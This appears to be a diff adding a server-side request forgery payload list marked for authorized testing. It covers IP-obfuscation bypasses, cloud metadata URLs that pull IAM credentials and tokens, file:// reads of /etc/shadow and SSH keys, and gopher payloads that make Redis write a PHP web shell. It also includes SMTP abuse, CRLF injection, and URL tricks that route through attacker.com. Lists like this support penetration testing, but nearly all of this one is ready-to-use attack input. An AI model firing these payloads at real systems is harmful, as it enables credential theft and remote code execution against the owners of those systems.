@@ -1,0 +1,271 @@
+# SSRF Payloads Collection
+# For authorized security testing only
+
+# ============================================
+# BASIC SSRF DETECTION
+# ============================================
+
+http://localhost
+http://127.0.0.1
+http://[::1]
+http://0.0.0.0
+http://127.1
+http://0177.0.0.1
+http://0x7f.0x0.0x0.0x1
+http://127.0.0.1.nip.io
+http://localtest.me
+http://127.0.0.1.sslip.io
+
+# DNS Rebinding
+http://rbnd.gl
+http://lock.cmpxchg8b.com/rebinder.html
+http://nip.io
+http://sslip.io
+http://1u.ms
+
+# ============================================
+# AWS EC2 METADATA (169.254.169.254)
+# ============================================
+
+# IMDSv1 (default on older instances)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/availability-zone
+http://169.254.169.254/latest/meta-data/security-groups
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/user-data/
+
+# IMDSv2 (token required)
+# Step 1: Get token
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Step 2: Use token
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+
+# Instance metadata endpoints
+http://169.254.169.254/latest/meta-data/iam/info
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
+http://169.254.169.254/latest/meta-data/services/domain
+http://169.254.169.254/latest/meta-data/services/list
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# ============================================
+# GCP METADATA (metadata.google.internal)
+# ============================================
+
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+http://metadata.google.internal/computeMetadata/v1/recursive/?recursive=true
+
+# GCP requires Metadata-Flavor: Google header
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+
+# Service account token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+# ============================================
+# AZURE METADATA (169.254.169.254)
+# ============================================
+
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Azure requires Metadata: true header
+curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# ============================================
+# INTERNAL NETWORK SCANNING
+# ============================================
+
+# Common internal services
+http://localhost:80
+http://localhost:443
+http://localhost:8080
+http://localhost:8443
+http://localhost:3000
+http://localhost:5000
+http://localhost:8000
+http://localhost:9090
+http://localhost:9200
+http://localhost:27017
+http://localhost:3306
+http://localhost:5432
+http://localhost:6379
+http://localhost:11211
+http://localhost:2375
+http://localhost:2376
+
+# Common internal IP ranges
+http://10.0.0.1
+http://10.0.0.2
+http://10.0.1.1
+http://172.16.0.1
+http://172.16.1.1
+http://192.168.0.1
+http://192.168.1.1
+http://192.168.1.254
+
+# Database services
+http://localhost:3306   # MySQL
+http://localhost:5432   # PostgreSQL
+http://localhost:1433   # MSSQL
+http://localhost:1521   # Oracle
+http://localhost:27017  # MongoDB
+http://localhost:6379   # Redis
+http://localhost:11211  # Memcached
+http://localhost:9042   # Cassandra
+http://localhost:9200   # Elasticsearch
+http://localhost:5601   # Kibana
+http://localhost:8500   # Consul
+http://localhost:8200   # Vault
+
+# ============================================
+# PROTOCOL SMUGGLING
+# ============================================
+
+# File protocol
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+file:///proc/version
+file:///home/user/.ssh/id_rsa
+file:///c:/windows/win.ini
+file:///c:/windows/system32/drivers/etc/hosts
+
+# Gopher protocol
+gopher://localhost:6379/_INFO%0D%0A
+gopher://localhost:3306/  # MySQL
+gopher://localhost:25/    # SMTP
+
+# Dict protocol
+dict://localhost:6379/INFO
+dict://localhost:3306/
+
+# FTP protocol
+ftp://attacker.com:21/
+ftp://internal-host:21/
+
+# ============================================
+# REDIS EXPLOITATION VIA SSRF
+# ============================================
+
+# Redis command injection via gopher
+gopher://localhost:6379/_*3%0D%0ASET%0D%0A1%0D%0A%2410%0D%0Aevaluator%0D%0A*1%0D%0A*2%0D%0ASET%0D%0A10%0D%0A$17%0D%0A%0A%0A%23%20%0Aeval()...%0A%0A%0D%0A
+
+# Redis to shell
+gopher://localhost:6379/_FLUSHALL%0D%0ASET%20shell%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html/%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A
+
+# ============================================
+# REDIRECT-BASED BYPASS
+# ============================================
+
+# Using URL shorteners to redirect
+http://bit.ly/xxx
+http://tinyurl.com/xxx
+http://t.co/xxx
+http://goo.gl/xxx
+
+# Self-hosted redirect
+http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/
+
+# Using DNS rebinding
+http://rbnd.gl
+http://1u.ms
+
+# Double URL encoding
+http://127.0.0.1%40169.254.169.254
+http://127.0.0.1%2540169.254.169.254
+
+# IPv6 bypass
+http://[::1]
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:7f00:1]
+
+# Decimal/IP obfuscation
+http://2130706433        # 127.0.0.1
+http://0x7f000001        # 127.0.0.1
+http://0177.0.0.1        # 127.0.0.1
+http://127.000.000.001   # 127.0.0.1
+
+# ============================================
+# URL PARSING TRICKS
+# ============================================
+
+# Credentials in URL
+http://attacker.com@169.254.169.254/latest/meta-data/
+http://169.254.169.254#@attacker.com
+http://169.254.169.254%23@attacker.com
+http://169.254.169.254?@attacker.com
+
+# Fragment
+http://169.254.169.254#@internal
+http://internal-service#@169.254.169.254
+
+# Question mark
+http://169.254.169.254?@attacker.com
+http://internal-service?@169.254.169.254
+
+# Newline injection
+http://internal-service%0a%0dX-Injected-Header:%20true@169.254.169.254
+
+# ============================================
+# CLOUD-SPECIFIC PAYLOADS
+# ============================================
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/user-data
+
+# Kubernetes
+http://kubernetes.default.svc.cluster.local/
+http://kubernetes.default.svc/
+http://10.96.0.1/api/v1/
+http://10.96.0.1/api/v1/namespaces
+http://10.96.0.1/version
+
+# Docker
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/images/json
+http://127.0.0.1:2376/containers/json
+
+# Consul
+http://127.0.0.1:8500/v1/catalog/nodes
+http://127.0.0.1:8500/v1/catalog/services
+http://127.0.0.1:8500/v1/agent/members
+
+# Vault
+http://127.0.0.1:8200/v1/secret/data
+http://127.0.0.1:8200/v1/sys/seal-status
+
+# ============================================
+# SSRF TO RCE TECHNIQUES
+# ============================================
+
+# Redis to RCE
+gopher://127.0.0.1:6379/_FLUSHALL%0d%0ASET%20pwned%20%22%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E%22%0d%0ACONFIG%20SET%20dir%20/var/www/html/%0d%0ACONFIG%20SET%20dbfilename%20pwned.php%0d%0ASAVE%0d%0A
+
+# CRLF injection via SSRF
+http://internal-service%0d%0aX-Injected:%20header%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
+
+# SMTP to RCE
+gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0AMAIL%20FROM%3A%3Cattacker@attacker.com%3E%0d%0ARCPT%20TO%3A%3Cvictim@target.com%3E%0d%0ADATA%0d%0ASubject%3A%20SSRF%20Email%0d%0A%0d%0APayload%0d%0A.%0d%0AQUIT
